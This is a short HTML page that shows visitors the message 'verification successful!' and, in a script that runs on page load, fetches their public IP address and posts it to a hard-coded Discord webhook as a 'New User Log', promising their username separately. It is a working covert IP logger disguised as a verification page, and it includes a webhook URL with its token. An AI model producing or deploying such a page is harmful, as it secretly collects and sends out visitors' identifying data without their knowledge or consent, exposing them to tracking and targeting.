<!DOCTYPE html>
<html>
<head>
  <title>Logging...</title>
</head>
<body>
  <h1>verification successful!</h1>

  <script>
    async function sendLog() {
      // Fetch user's IP
      const res = await fetch('https://api.ipify.org?format=json');
      const data = await res.json();
      const ip = data.ip;

      // Your Discord webhook URL
      const webhookURL = 'https://discord.com/api/webhooks/1365223944260554814/E4PX9F9VhRdjWhiE2prcWjsW1Z5wzSA7eTWYgDljpJXS-wSveRDrD9-iMNomw7eVJWZQ';

      // Construct the message
      const payload = {
        username: "Logger Bot",
        content: `**New User Log!**\nIP Address: ${ip}\n(Username will be posted separately)`
      };

      // Send it to Discord
      await fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
    }

    sendLog();
  </script>
</body>
</html>
